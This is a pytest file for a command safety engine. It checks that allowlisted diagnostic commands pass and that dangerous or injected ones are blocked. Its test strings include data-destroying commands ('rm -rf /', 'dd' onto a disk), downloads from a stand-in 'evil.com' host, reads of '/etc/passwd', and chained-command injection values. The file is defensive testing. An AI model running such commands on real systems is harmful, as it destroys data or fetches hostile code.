"""
Unit tests for the Safety Engine (src/safety.py).
Tests cover allowlist, denylist, injection detection, and edge cases.
"""
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from src.safety import (
    is_safe_command,
    contains_injection,
    DANGEROUS_COMMANDS_DENYLIST,
    SAFE_COMMANDS_ALLOWLIST,
    INJECTION_PATTERNS,
)


# ──────────────────────────────────────────────
# is_safe_command — basic allow / deny
# ──────────────────────────────────────────────
class TestIsSafeCommand:
    """Core allowlist / denylist tests."""

    # --- Safe commands are allowed ---
    def test_safe_ping(self):
        assert is_safe_command("ping 8.8.8.8") is True

    def test_safe_echo(self):
        assert is_safe_command("echo hello world") is True

    def test_safe_hostname(self):
        assert is_safe_command("hostname") is True

    def test_safe_whoami(self):
        assert is_safe_command("whoami") is True

    def test_safe_ipconfig(self):
        assert is_safe_command("ipconfig /all") is True

    def test_safe_df(self):
        assert is_safe_command("df -h") is True

    def test_safe_free(self):
        assert is_safe_command("free -m") is True

    def test_safe_systeminfo(self):
        assert is_safe_command("systeminfo") is True

    def test_safe_tasklist(self):
        assert is_safe_command("tasklist /fo table") is True

    def test_safe_dir(self):
        assert is_safe_command("dir C:\\") is True

    def test_safe_ls(self):
        assert is_safe_command("ls -la") is True

    def test_safe_wmic(self):
        assert is_safe_command("wmic cpu get loadpercentage") is True

    def test_safe_netstat(self):
        assert is_safe_command("netstat -an") is True

    def test_safe_nslookup(self):
        assert is_safe_command("nslookup google.com") is True

    def test_safe_tracert(self):
        assert is_safe_command("tracert 8.8.8.8") is True

    def test_safe_type(self):
        assert is_safe_command("type readme.txt") is True

    def test_safe_findstr(self):
        assert is_safe_command("findstr /i error log.txt") is True

    def test_safe_sc(self):
        assert is_safe_command("sc query type= service") is True

    def test_safe_net(self):
        assert is_safe_command("net statistics server") is True

    # --- All allowlist commands pass individually ---
    def test_all_allowlist_commands(self):
        for cmd in SAFE_COMMANDS_ALLOWLIST:
            assert is_safe_command(cmd) is True, f"Allowlist command '{cmd}' was rejected"

    # --- Dangerous commands are blocked ---
    def test_block_rm(self):
        assert is_safe_command("rm -rf /") is False

    def test_block_del(self):
        assert is_safe_command("del /f /q C:\\*") is False

    def test_block_format(self):
        assert is_safe_command("format C:") is False

    def test_block_sudo(self):
        assert is_safe_command("sudo rm -rf /") is False

    def test_block_shutdown(self):
        assert is_safe_command("shutdown /s /t 0") is False

    def test_block_reboot(self):
        assert is_safe_command("reboot") is False

    def test_block_chmod(self):
        assert is_safe_command("chmod 777 /etc/passwd") is False

    def test_block_chown(self):
        assert is_safe_command("chown root:root /etc") is False

    def test_block_mkfs(self):
        assert is_safe_command("mkfs.ext4 /dev/sda1") is False

    def test_block_kill(self):
        assert is_safe_command("kill -9 1234") is False

    def test_block_pkill(self):
        assert is_safe_command("pkill -f process") is False

    def test_block_dd(self):
        assert is_safe_command("dd if=/dev/zero of=/dev/sda") is False

    def test_block_passwd(self):
        assert is_safe_command("passwd root") is False

    def test_block_powershell(self):
        assert is_safe_command("powershell -Command Get-Process") is False

    def test_block_cmd(self):
        assert is_safe_command("cmd /c del file.txt") is False

    # --- All denylist commands are blocked individually ---
    def test_all_denylist_commands(self):
        for cmd in DANGEROUS_COMMANDS_DENYLIST:
            assert is_safe_command(cmd) is False, f"Denylisted command '{cmd}' was allowed"

    # --- Unknown commands are blocked ---
    def test_block_unknown_curl(self):
        assert is_safe_command("curl http://evil.com") is False

    def test_block_unknown_wget(self):
        assert is_safe_command("wget http://evil.com/shell.sh") is False

    def test_block_unknown_python(self):
        assert is_safe_command("python -c 'import os; os.system(\"rm -rf /\")'") is False

    def test_block_unknown_arbitrary(self):
        assert is_safe_command("my_custom_script.sh") is False

    # --- Empty / whitespace ---
    def test_empty_string(self):
        assert is_safe_command("") is False

    def test_whitespace_only(self):
        assert is_safe_command("   ") is False

    def test_none_like_empty(self):
        # Passing None would raise TypeError; test empty strings instead
        assert is_safe_command("") is False


# ──────────────────────────────────────────────
# Case insensitivity
# ──────────────────────────────────────────────
class TestCaseInsensitivity:
    """Ensure allowlist matching is case-insensitive."""

    def test_uppercase_ping(self):
        assert is_safe_command("PING 8.8.8.8") is True

    def test_mixed_case_echo(self):
        assert is_safe_command("Echo Hello") is True

    def test_uppercase_hostname(self):
        assert is_safe_command("HOSTNAME") is True

    def test_uppercase_ipconfig(self):
        assert is_safe_command("IPCONFIG /all") is True


# ──────────────────────────────────────────────
# Commands with arguments — edge cases
# ──────────────────────────────────────────────
class TestCommandsWithArguments:
    """Test commands with various argument patterns."""

    def test_ping_with_count(self):
        assert is_safe_command("ping -n 4 192.168.1.1") is True

    def test_echo_with_special_chars(self):
        assert is_safe_command("echo 'hello world 123'") is True

    def test_dir_with_path(self):
        assert is_safe_command("dir C:\\Windows\\System32") is True

    def test_wmic_complex_query(self):
        assert is_safe_command("wmic logicaldisk get caption,size,freespace") is True

    def test_sc_query_all(self):
        assert is_safe_command("sc query type= service state= all") is True

    def test_findstr_with_flags(self):
        assert is_safe_command("findstr /i /s error *.log") is True

    # Safe command whose arguments contain a dangerous word as substring
    def test_echo_with_dangerous_substring_format(self):
        """'echo formatting disk' — 'format' is a dangerous keyword but
        'formatting' is not an exact base-command match."""
        # The argument 'formatting' is not the base_cmd, so it should pass
        assert is_safe_command("echo formatting disk") is True

    def test_echo_with_dangerous_substring_rm(self):
        """'echo remove this' — 'rm' as substring in 'remove' shouldn't block."""
        assert is_safe_command("echo remove this") is True

    def test_ping_with_dangerous_hostname(self):
        """ping a host named 'shutdown.example.com' should still be safe."""
        assert is_safe_command("ping shutdown.example.com") is True


# ──────────────────────────────────────────────
# contains_injection — shell metacharacter detection
# ──────────────────────────────────────────────
class TestContainsInjection:
    """Tests for the injection-detection layer."""

    def test_no_injection_simple(self):
        assert contains_injection("ping 8.8.8.8") is False

    def test_no_injection_echo(self):
        assert contains_injection("echo hello") is False

    def test_injection_double_ampersand(self):
        assert contains_injection("ping 8.8.8.8 && rm -rf /") is True

    def test_injection_double_pipe(self):
        assert contains_injection("echo ok || shutdown /s") is True

    def test_injection_semicolon(self):
        assert contains_injection("echo ok; rm -rf /") is True

    def test_injection_pipe(self):
        assert contains_injection("tasklist | findstr svchost") is True

    def test_injection_backtick(self):
        assert contains_injection("echo `whoami`") is True

    def test_injection_dollar_paren(self):
        assert contains_injection("echo $(cat /etc/passwd)") is True

    def test_injection_dollar_brace(self):
        assert contains_injection("echo ${PATH}") is True

    def test_injection_newline(self):
        assert contains_injection("echo hello\nrm -rf /") is True

    def test_injection_carriage_return(self):
        assert contains_injection("echo hello\rrm -rf /") is True


# ──────────────────────────────────────────────
# Integration: injection + is_safe_command
# ──────────────────────────────────────────────
class TestInjectionBlockedByIsSafe:
    """Injection attempts must also be blocked by is_safe_command."""

    def test_safe_cmd_with_chain(self):
        assert is_safe_command("ping 8.8.8.8 && rm -rf /") is False

    def test_safe_cmd_with_pipe(self):
        assert is_safe_command("tasklist | findstr svchost") is False

    def test_safe_cmd_with_semicolon(self):
        assert is_safe_command("echo hello; shutdown /s") is False

    def test_safe_cmd_with_backtick(self):
        assert is_safe_command("echo `whoami`") is False

    def test_safe_cmd_with_dollar_paren(self):
        assert is_safe_command("echo $(cat /etc/passwd)") is False

    def test_safe_cmd_with_dollar_brace(self):
        assert is_safe_command("echo ${HOME}") is False


# ──────────────────────────────────────────────
# Constants sanity checks
# ──────────────────────────────────────────────
class TestConstants:
    """Ensure the constants exist and are populated."""

    def test_denylist_is_list(self):
        assert isinstance(DANGEROUS_COMMANDS_DENYLIST, list)

    def test_denylist_not_empty(self):
        assert len(DANGEROUS_COMMANDS_DENYLIST) > 0

    def test_allowlist_is_list(self):
        assert isinstance(SAFE_COMMANDS_ALLOWLIST, list)

    def test_allowlist_not_empty(self):
        assert len(SAFE_COMMANDS_ALLOWLIST) > 0

    def test_injection_patterns_exist(self):
        assert isinstance(INJECTION_PATTERNS, list)
        assert len(INJECTION_PATTERNS) > 0

    def test_no_overlap_allow_deny(self):
        """Allowlist and denylist must not share commands."""
        allow_lower = {c.lower() for c in SAFE_COMMANDS_ALLOWLIST}
        deny_lower = {c.lower() for c in DANGEROUS_COMMANDS_DENYLIST}
        overlap = allow_lower & deny_lower
        assert len(overlap) == 0, f"Overlap found: {overlap}"
